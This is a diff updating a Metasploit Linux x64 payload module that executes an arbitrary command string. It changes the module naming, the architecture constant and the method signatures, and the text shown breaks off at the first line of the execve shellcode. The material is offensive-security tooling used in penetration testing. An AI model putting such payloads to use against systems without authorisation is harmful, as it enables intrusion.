@@ -1,12 +1,12 @@
 ##
-# This module requires Metasploit: http://metasploit.com/download
+# This module requires Metasploit: https://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
 
+module MetasploitModule
 
-require 'msf/core'
+  CachedSize = 47
 
-module Metasploit3
   include Msf::Payload::Single
   include Msf::Payload::Linux
 
@@ -17,16 +17,16 @@ module Metasploit3
       'Author'        => 'ricky',
       'License'       => MSF_LICENSE,
       'Platform'      => 'linux',
-      'Arch'          => ARCH_X86_64))
+      'Arch'          => ARCH_X64))
 
     register_options(
       [
         OptString.new('CMD',  [ true,  "The command string to execute" ]),
-      ], self.class)
+      ])
   end
 
-  def generate_stage
-    cmd = (datastore['CMD'] || '') << "\x00"
+  def generate_stage(opts={})
+    cmd = (datastore['CMD'] || '') + "\x00"
     call = "\xe8" + [cmd.length].pack('V')
     payload =
       "\x6a\x3b"                     + # pushq  $0x3b
